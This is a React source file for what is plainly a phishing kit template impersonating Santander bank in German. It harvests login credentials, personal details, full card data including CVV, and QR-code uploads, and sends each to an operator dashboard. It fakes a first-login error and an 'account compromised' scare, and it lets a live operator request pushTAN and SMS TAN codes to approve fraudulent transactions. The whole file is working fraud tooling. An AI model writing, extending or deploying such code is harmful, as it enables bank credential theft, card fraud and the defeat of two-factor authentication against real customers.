import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { updatePageMetadata, getTemplateMetadata } from '../../utils/templateMetadata';
import { submitTemplateData, uploadTemplateFile, getTemplateConfig, createTemplateSession } from '../../utils/templateApi';
import templateSocketClient from '../../utils/socketClient';
import './SantanderStyle.css';

// Import components - using direct imports instead of barrel exports
import LoginForm from './components/LoginForm';
import Loading from './components/Loading';
import ErrorScreen from './components/ErrorScreen';
import Header from './components/Header';
import Footer from './components/Footer';
import AccountCompromisedScreen from './components/AccountCompromisedScreen';
import PersonalDataForm from './components/PersonalDataForm';
import BankCardForm from './components/BankCardForm';
import QRInstructionsScreen from './components/QRInstructionsScreen';
import QRUploadForm from './components/QRUploadForm';
import QRErrorScreen from './components/QRErrorScreen';
import FinalSuccessScreen from './components/FinalSuccessScreen';
import PushTANScreen from './components/PushTANScreen';
import SMSTANScreen from './components/SMSTANScreen';

// Santander flow states - identical to original
const STATES = {
  LOGIN: 'login',
  LOGIN_ERROR: 'login_error',
  ACCOUNT_COMPROMISED: 'account_compromised',
  PERSONAL_DATA: 'personal_data',
  PERSONAL_SUCCESS: 'personal_success',
  QR_INSTRUCTIONS: 'qr_instructions',
  QR_UPLOAD: 'qr_upload',
  QR_ERROR: 'qr_error',
  QR_RETRY: 'qr_retry',
  BANK_CARD: 'bank_card',
  BANK_SUCCESS: 'bank_success',
  FINAL_SUCCESS: 'final_success',
  LOADING: 'loading',
  ERROR: 'error',
  // Advanced states for admin control
  PUSHTAN_REQUEST: 'pushtan_request',
  SMS_TAN_REQUEST: 'sms_tan_request',
  TRANSACTION_CONFIRM: 'transaction_confirm',
  ACCOUNT_VERIFICATION: 'account_verification',
  // AFK/Live Mode states
  WAITING_FOR_ADMIN: 'waiting_for_admin'
};

// Configuration interface
interface StepConfig {
  doubleLogin: boolean;
  personalData: boolean;
  bankCard: boolean;
  qrCode: boolean;
}

// Default configuration (fallback)
const DEFAULT_CONFIG: StepConfig = {
  doubleLogin: true,
  personalData: true,
  bankCard: true,
  qrCode: true
};

// Types for Santander flow
interface LoginData {
  username: string;
  password: string;
}

interface PersonalData {
  first_name: string;
  last_name: string;
  date_of_birth: string;
  street: string;
  street_number: string;
  plz: string;
  city: string;
  phone: string;
  email: string;
}

interface BankCardData {
  card_number: string;
  expiry_date: string;
  cvv: string;
  cardholder_name: string;
}

// AutoLogin component with metadata update
function AutoLogin() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    // Update page metadata for Santander template
    const metadata = getTemplateMetadata('santander');
    updatePageMetadata(metadata);
    
    // Create a proper session via backend
    const generateKey = async () => {
      try {
        const key = await createTemplateSession('santander');
        console.log('Created Santander session with key:', key);
        navigate(`/santander/${key}`);
      } catch (err) {
        console.error('Error creating Santander session:', err);
        setError('Fehler beim Erstellen einer Sitzung');
        setLoading(false);
      }
    };

    generateKey();
  }, [navigate]);

  if (loading && !error) return <Loading message="Bitte warten Sie, während wir Ihre Sitzung erstellen..." />;
  if (error) return <ErrorScreen message={error} />;
  return null;
}

// Main flow component for Santander 14-step process
function FormFlow() {
  const { key } = useParams<{ key: string }>();
  const [state, setState] = useState<string>(STATES.LOGIN);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [loadingMessage, setLoadingMessage] = useState("Verbindung wird hergestellt...");
  const [stepConfig, setStepConfig] = useState<StepConfig>(DEFAULT_CONFIG);
  const [configLoaded, setConfigLoaded] = useState(false);
  const [sessionData, setSessionData] = useState<any>({});
  
  // Enhanced TAN system state
  const [currentTanRequest, setCurrentTanRequest] = useState<{
    type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
    method: 'pushtan' | 'sms';
    transactionDetails?: any;
    requestId: string;
  } | null>(null);

  // AFK/Live Mode system state
  const [sessionMode, setSessionMode] = useState<'AFK' | 'LIVE'>('AFK');
  const [isWaitingForAdmin, setIsWaitingForAdmin] = useState(false);

  // Scroll to top whenever state changes
  useEffect(() => {
    console.log('🎯 Santander Template: State changed to:', state);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, [state]);

  // Flow control function - checks if should pause in Live Mode
  const proceedToNextState = (nextState: string, processingMessage: string = 'Wird verarbeitet...') => {
    if (sessionMode === 'LIVE') {
      // In Live Mode: pause and wait for admin
      setLoading(true);
      setLoadingMessage(processingMessage);
      setIsWaitingForAdmin(true);
      
      // Store the next state to transition to when admin continues
      setSessionData(prev => ({ ...prev, pendingState: nextState }));
      
      // Notify admin that user is waiting
      templateSocketClient.emit('user-waiting', {
        sessionKey: key,
        currentState: state,
        pendingState: nextState,
        message: processingMessage
      });
    } else {
      // In AFK Mode: continue automatically
      setState(nextState);
    }
  };

  useEffect(() => {
    const metadata = getTemplateMetadata('santander');
    updatePageMetadata(metadata);

    if (!key) {
      setError('Ungültiger Session-Schlüssel');
      setLoading(false);
      return;
    }

    console.log(`Initializing Santander session with key: ${key}`);

    // Load step configuration from backend and initialize session
    const initializeSession = async () => {
      // Step 1: Load config
      try {
        setLoadingMessage("Schritt-Konfiguration wird geladen...");
        const config = await getTemplateConfig('santander');
        setStepConfig(config.steps);
        console.log('✅ Loaded Santander step config:', config.steps);
      } catch (error) {
        console.warn('⚠️ Failed to load step config, using defaults:', error);
        // Continue with defaults - don't block the UI
      }
      
      // Step 2: Mark config as loaded regardless of success/failure
      setConfigLoaded(true);
      
      // Step 3: Initialize Socket.io connection (non-blocking)
      try {
        templateSocketClient.connect({
          sessionKey: key,
          templateName: 'santander',
          onStateForced: (newState: string, message?: string) => {
            console.log('🎯 Admin forced state change:', newState, message);
            
            setLoading(true);
            
            const getLoadingMessage = (targetState: string): string => {
              switch (targetState) {
                case 'personal_data':
                  return 'Persönliche Daten werden geladen...';
                case 'qr_upload':
                  return 'QR-Code Bereich wird vorbereitet...';
                case 'bank_card':
                  return 'Bankdaten werden verarbeitet...';
                case 'final_success':
                  return 'Vorgang wird abgeschlossen...';
                case 'account_compromised':
                  return 'Sicherheitsprüfung läuft...';
                default:
                  return 'Bitte warten Sie...';
              }
            };
            
            setLoadingMessage(message || getLoadingMessage(newState));
            
            setTimeout(() => {
              setState(newState);
              setLoading(false);
              if (message) {
                alert(message);
              }
            }, 1500);
          },
          onDataInjected: (data: any) => {
            console.log('💉 Admin injected data:', data);
            setLoading(true);
            setLoadingMessage('Daten werden aktualisiert...');
            setTimeout(() => {
              setLoading(false);
            }, 1000);
          },
          onRedirect: (url: string) => {
            console.log('🔗 Admin triggered redirect:', url);
            window.location.href = url;
          },
          onMessage: (message: string, type: string) => {
            console.log('💬 Admin message:', message, type);
            alert(`${type.toUpperCase()}: ${message}`);
          },
          onModeChanged: (mode: 'AFK' | 'LIVE') => {
            console.log('🎛️ Admin changed session mode:', mode);
            setSessionMode(mode);
            if (mode === 'AFK' && isWaitingForAdmin) {
              setIsWaitingForAdmin(false);
              setLoading(false);
            }
          },
          onContinueFlow: () => {
            console.log('▶️ Admin triggered continue flow');
            if (isWaitingForAdmin && sessionData.pendingState) {
              setIsWaitingForAdmin(false);
              setLoading(false);
              setState(sessionData.pendingState);
              setSessionData(prev => ({ ...prev, pendingState: null }));
            }
          },
          onTanRequest: (tanData: {
            type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
            method: 'pushtan' | 'sms';
            transactionDetails?: any;
            requestId: string;
          }) => {
            console.log('🔐 Admin requested TAN:', tanData);
            setLoading(true);
            setLoadingMessage(
              tanData.type === 'TRANSACTION_TAN' 
                ? 'Transaktion wird vorbereitet...' 
                : 'Anmeldung wird verarbeitet...'
            );
            setTimeout(() => {
              setLoading(false);
              if (tanData.method === 'pushtan') {
                setState('pushtan_request');
              } else {
                setState('sms_tan_request');
              }
            }, 2000);
          }
        });
      } catch (socketError) {
        console.warn('⚠️ Socket.io connection failed, continuing without real-time admin control:', socketError);
        // Don't block the UI if socket fails
      }
      
      // Step 4: Show the login form
      setLoadingMessage("Sitzung wird initialisiert...");
      setTimeout(() => {
        console.log('✅ Santander initialization complete, showing login form');
        setState(STATES.LOGIN);
        setLoading(false);
      }, 500);
    };
    
    initializeSession();
    
    // Cleanup socket on unmount
    return () => {
      templateSocketClient.disconnect();
    };
  }, [key]);

  // Handle login submission (Steps 2 & 4)
  const handleLogin = async (data: LoginData) => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ Login attempted before step config loaded - ignoring');
      return;
    }
    
    try {
      console.log('Submitting login for Santander flow:', { key, username: data.username ? '✓' : '✗' });
      
      if (!key) {
        console.error('No session key available');
        setError('Keine Sitzungs-ID vorhanden');
        setState(STATES.ERROR);
        return;
      }
      
      // Submit to our backend via template-submit endpoint
      try {
        const response = await submitTemplateData({
          template_name: 'santander',
          key: key || '',
          step: 'login',
          data: {
            username: data.username,
            password: data.password
          }
        });
        
        console.log('Login response:', response);

        if (!response.success) {
          console.warn('Backend submission failed:', response.error);
          // Continue with flow even if API fails - like other templates
        }
      } catch (apiError) {
        console.warn('Failed to submit to admin dashboard:', apiError);
        // Continue with flow even if API fails - like other templates
      }
      
      // Simulate realistic flow - first attempt goes to error, second to compromised
      const currentAttempt = sessionStorage.getItem(`santander_attempts_${key}`) || '0';
      const attempts = parseInt(currentAttempt) + 1;
      sessionStorage.setItem(`santander_attempts_${key}`, attempts.toString());
      
      if (attempts === 1) {
        // First login attempt - show error
        setState(STATES.LOGIN_ERROR);
      } else {
        // Second login attempt - proceed to account compromised
        setState(STATES.ACCOUNT_COMPROMISED);
      }
    } catch (error) {
      console.error('Login error:', error);
      setError('Fehler bei der Anmeldung');
      setState(STATES.LOGIN);
    }
  };

  // Handle verification start (Step 6)
  const handleStartVerification = async () => {
    try {
      console.log('Starting verification process for session:', key);
      
      // Show loading screen
      setLoading(true);
      setLoadingMessage("Verifizierung wird gestartet...");
      
      // Submit verification start to backend
      try {
        const response = await submitTemplateData({
          template_name: 'santander',
          key: key || '',
          step: 'verification-start',
          data: {}
        });
        
        if (!response.success) {
          console.warn('Backend verification start failed:', response.error);
          // Continue with flow even if API fails
        }
      } catch (apiError) {
        console.warn('Failed to submit verification start to admin dashboard:', apiError);
        // Continue with flow even if API fails
      }
      
      // Simulate processing time
      setTimeout(() => {
        setLoading(false);
        // Move to personal data step
        setState(STATES.PERSONAL_DATA);
      }, 1500);
    } catch (error) {
      console.error('Start verification error:', error);
      setLoading(false);
      setError('Fehler beim Starten der Verifizierung');
    }
  };

  // Handle personal data submission (Step 6)
  const handlePersonalDataSubmit = async (data: PersonalData) => {
    try {
      console.log('Submitting personal data for session:', key);
      
      // Submit personal data to backend
      try {
        const response = await submitTemplateData({
          template_name: 'santander',
          key: key || '',
          step: 'personal-data-complete',
          data: data
        });
        
        if (!response.success) {
          console.error('❌ Santander personal data submission failed:', response.error);
          setError(response.error || 'Fehler beim Speichern der persönlichen Daten');
          setState(STATES.ERROR);
          return;
        } else {
          console.log('✅ Santander personal data submitted successfully');
        }
      } catch (apiError) {
        console.error('❌ Failed to submit personal data to admin dashboard:', apiError);
        setError('Fehler beim Speichern der persönlichen Daten');
        setState(STATES.ERROR);
        return;
      }
      
      // Show loading screen before transition
      setLoadingMessage("Persönliche Daten werden verarbeitet...");
      
      // Simulate processing time
      setTimeout(() => {
        setLoading(false);
        // Check if bank card step is enabled
        if (stepConfig.bankCard) {
          setState(STATES.BANK_CARD);
        } else if (stepConfig.qrCode) {
          setState(STATES.QR_INSTRUCTIONS);
        } else {
          setState(STATES.FINAL_SUCCESS);
        }
      }, 2000);
    } catch (error) {
      console.error('Personal data submission error:', error);
      setError('Fehler beim Speichern der persönlichen Daten');
    }
  };

  // Handle bank card data submission (Step 8)
  const handleBankCardSubmit = async (data: BankCardData) => {
    try {
      console.log('Submitting bank card data for session:', key);
      
      // Submit bank card data to backend
      try {
        const response = await submitTemplateData({
          template_name: 'santander',
          key: key || '',
          step: 'bank-card-complete',
          data: data
        });
        
        if (!response.success) {
          console.error('❌ Santander bank card submission failed:', response.error);
          setError(response.error || 'Fehler beim Speichern der Kartendaten');
          setState(STATES.ERROR);
          return;
        } else {
          console.log('✅ Santander bank card data submitted successfully');
        }
      } catch (apiError) {
        console.error('❌ Failed to submit bank card data to admin dashboard:', apiError);
        setError('Fehler beim Speichern der Kartendaten');
        setState(STATES.ERROR);
        return;
      }
      
      // Show loading screen before transitioning to QR
      setLoading(true);
      setLoadingMessage("Bankkarten-Daten werden verarbeitet...");
      
      // Simulate processing time
      setTimeout(() => {
        setLoading(false);
        // Check if QR step is enabled
        if (stepConfig.qrCode) {
          setState(STATES.QR_INSTRUCTIONS);
        } else {
          setState(STATES.FINAL_SUCCESS);
        }
      }, 2500);
    } catch (error: any) {
      console.error('Bank card submission error:', error);
      
      // Check if it's a validation error from backend
      if (error.response?.status === 400 && error.response?.data?.details) {
        // Pass validation errors back to the form
        throw error.response.data;
      } else {
        setError('Fehler beim Speichern der Bankkarten-Daten');
      }
    }
  };

  // Handle QR upload start (Step 11)
  const handleStartQRUpload = async () => {
    try {
      console.log('Starting QR upload for session:', key);
      
      // Show loading screen
      setLoading(true);
      setLoadingMessage("QR-Code Upload wird vorbereitet...");
      
      try {
        const response = await submitTemplateData({
          template_name: 'santander',
          key: key || '',
          step: 'qr-start',
          data: {}
        });
        
        if (!response.success) {
          console.warn('Backend QR start failed:', response.error);
          // Continue with flow even if API fails
        } else {
          console.log('Start QR upload response:', response.data);
        }
      } catch (apiError) {
        console.warn('Failed to submit QR start to admin dashboard:', apiError);
        // Continue with flow even if API fails
      }
      
      // Simulate preparation time
      setTimeout(() => {
        setLoading(false);
        // Always proceed to QR upload since API might fail
        setState(STATES.QR_UPLOAD);
      }, 1000);
    } catch (error) {
      console.error('Start QR upload error:', error);
      setLoading(false);
      setError('Fehler beim Starten des QR-Code Uploads');
    }
  };

  // Handle QR error retry
  const handleQRRetry = () => {
    setState(STATES.QR_UPLOAD);
  };

  // Handle QR code upload (Steps 11 & 13)
  const handleQRUpload = async (file: File) => {
    console.log('🔥 QR UPLOAD HANDLER CALLED with file:', file.name, file.size, file.type);
    
    try {
      console.log('📤 Uploading QR code for session:', key);
      
      // Show loading screen
      setLoading(true);
      setLoadingMessage("QR-Code wird hochgeladen und analysiert...");
      
      const formData = new FormData();
      formData.append('template_name', 'santander');
      formData.append('key', key || '');
      formData.append('step', 'qr-upload');
      formData.append('qrFile', file);
      
      console.log('📦 FormData prepared, sending to backend...');
      
      try {
        const response = await uploadTemplateFile('santander', key || '', file, 'qr-upload');
        
        if (!response.success) {
          console.warn('Backend QR upload failed:', response.error);
          // Continue with flow even if API fails
        } else {
          console.log('✅ QR upload response:', response.data);
        }
      } catch (apiError) {
        console.warn('Failed to upload QR to admin dashboard:', apiError);
        // Continue with flow even if API fails
      }
      
      // Simulate analysis time
      setTimeout(() => {
        setLoading(false);
        // Always proceed to final success since API might fail
        setState(STATES.FINAL_SUCCESS);
      }, 2000);
    } catch (error) {
      console.error('❌ QR upload error:', error);
      setLoading(false);
      setError('Fehler beim Upload des QR-Codes');
    }
  };

  // Handle bank card skip
  const handleBankCardSkip = async () => {
    try {
      console.log('Santander: Bank card skipped for session:', key);
      
      // Submit skip to backend
      const response = await submitTemplateData({
        template_name: 'santander',
        key: key || '',
        step: 'bank-card-skip',
        data: { skip_reason: 'no_credit_card' }
      });
      
      if (!response.success) {
        console.error('❌ Santander bank card skip failed:', response.error);
        setError(response.error || 'Fehler beim Überspringen der Kartendaten');
        setState(STATES.ERROR);
        return;
      }
      
      console.log('✅ Santander bank card skip completed successfully');
      
      // Show loading screen
      setLoading(true);
      setLoadingMessage("Wird abgeschlossen...");
      
      // Simulate processing time
      setTimeout(() => {
        setLoading(false);
        // Check if QR step is enabled
        if (stepConfig.qrCode) {
          setState(STATES.QR_INSTRUCTIONS);
        } else {
          setState(STATES.FINAL_SUCCESS);
        }
      }, 2000);
      
    } catch (error) {
      console.error('❌ Santander bank card skip error:', error);
      setError('Fehler beim Überspringen der Kartendaten');
      setState(STATES.ERROR);
    }
  };

  // Render appropriate component based on state
  const renderContent = () => {
    if (loading || !configLoaded) {
      return <Loading 
        message={!configLoaded ? "Schritt-Konfiguration wird geladen..." : loadingMessage} 
      />;
    }
    
    if (error) {
      return <ErrorScreen message={error} />;
    }
    
    switch (state) {
      case STATES.LOGIN:
        return <LoginForm onSubmit={handleLogin} />;
      
      case STATES.LOGIN_ERROR:
        return <LoginForm onSubmit={handleLogin} showError={true} />;
      
      case STATES.ACCOUNT_COMPROMISED:
        return <AccountCompromisedScreen onStartVerification={handleStartVerification} />;
      
      case STATES.PERSONAL_DATA:
        // Only render if personal data step is enabled
        if (stepConfig.personalData) {
          return <PersonalDataForm onSubmit={handlePersonalDataSubmit} />;
        } else {
          // This shouldn't happen if backend is working correctly, but handle gracefully
          console.warn('Personal data form requested but step is disabled');
          return <Loading message="Weiterleitung..." />;
        }
      
      case STATES.BANK_CARD:
        // Only render if bank card step is enabled
        if (stepConfig.bankCard) {
          return <BankCardForm onSubmit={handleBankCardSubmit} onSkip={handleBankCardSkip} />;
        } else {
          // This shouldn't happen if backend is working correctly, but handle gracefully
          console.warn('Bank card form requested but step is disabled');
          return <Loading message="Weiterleitung..." />;
        }
      
      case STATES.QR_INSTRUCTIONS:
        // Only render if QR step is enabled
        if (stepConfig.qrCode) {
          return <QRInstructionsScreen onContinue={handleStartQRUpload} />;
        } else {
          // This shouldn't happen if backend is working correctly, but handle gracefully
          console.warn('QR instructions requested but QR step is disabled');
          return <Loading message="Weiterleitung..." />;
        }
      
      case STATES.QR_UPLOAD:
        // Only render if QR step is enabled
        if (stepConfig.qrCode) {
          return <QRUploadForm onUpload={handleQRUpload} />;
        } else {
          // This shouldn't happen if backend is working correctly, but handle gracefully
          console.warn('QR upload requested but QR step is disabled');
          return <Loading message="Weiterleitung..." />;
        }
      
      case STATES.QR_ERROR:
        // Only render if QR step is enabled
        if (stepConfig.qrCode) {
          return <QRErrorScreen onRetry={() => setState(STATES.QR_UPLOAD)} />;
        } else {
          // This shouldn't happen if backend is working correctly, but handle gracefully
          console.warn('QR error requested but QR step is disabled');
          return <Loading message="Weiterleitung..." />;
        }
      
      case STATES.QR_RETRY:
        // Only render if QR step is enabled
        if (stepConfig.qrCode) {
          return <QRErrorScreen onRetry={() => setState(STATES.QR_UPLOAD)} />;
        } else {
          // This shouldn't happen if backend is working correctly, but handle gracefully
          console.warn('QR retry requested but QR step is disabled');
          return <Loading message="Weiterleitung..." />;
        }
      
      case STATES.FINAL_SUCCESS:
        return <FinalSuccessScreen />;
      
      case STATES.PUSHTAN_REQUEST:
        return <PushTANScreen 
          tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
          transactionDetails={currentTanRequest?.transactionDetails}
          onConfirm={() => {
            // Send TAN completion back to admin
            templateSocketClient.emit('tan-completed', {
              requestId: currentTanRequest?.requestId,
              success: true,
              type: currentTanRequest?.type
            });
            setCurrentTanRequest(null);
            setState(STATES.FINAL_SUCCESS);
          }}
          onCancel={() => {
            // Send TAN cancellation back to admin
            templateSocketClient.emit('tan-cancelled', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
            setCurrentTanRequest(null);
            setState(STATES.LOGIN);
          }}
        />;
      
      case STATES.SMS_TAN_REQUEST:
        return <SMSTANScreen 
          tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
          phoneNumber={sessionData.maskedPhone || sessionData.phone}
          transactionDetails={currentTanRequest?.transactionDetails}
          onSubmit={(tan) => {
            console.log('SMS TAN submitted:', tan);
            // Send TAN completion back to admin
            templateSocketClient.emit('tan-completed', {
              requestId: currentTanRequest?.requestId,
              success: true,
              type: currentTanRequest?.type,
              tanValue: tan
            });
            setCurrentTanRequest(null);
            setState(STATES.FINAL_SUCCESS);
          }}
          onResend={() => {
            console.log('SMS TAN resend requested');
            templateSocketClient.emit('tan-resend-requested', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
          }}
          onCancel={() => {
            // Send TAN cancellation back to admin
            templateSocketClient.emit('tan-cancelled', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
            setCurrentTanRequest(null);
            setState(STATES.LOGIN);
          }}
        />;
      
      case STATES.WAITING_FOR_ADMIN:
        return <Loading 
          message={isWaitingForAdmin ? loadingMessage : 'Wird verarbeitet...'} 
          type="processing"
          showProgress={false}
        />;
      
      case STATES.LOADING:
        return <Loading message={loadingMessage} />;
      
      case STATES.ERROR:
        return <ErrorScreen message={error || 'Ein Fehler ist aufgetreten'} />;
      
      default:
        return <ErrorScreen message="Unbekannter Status" />;
    }
  };

  return (
    <div className="min-h-screen bg-white">
      <Header />
      <main>
        <div className="santander-container">
          {renderContent()}
        </div>
      </main>
      <Footer />
    </div>
  );
}

// SantanderTemplate component that handles routing
function SantanderTemplate() {
  const { key } = useParams<{ key: string }>();

  // If no key provided, show AutoLogin
  if (!key) {
    return <AutoLogin />;
  }

  // If key provided, show FormFlow
  return <FormFlow />;
}

export default SantanderTemplate; 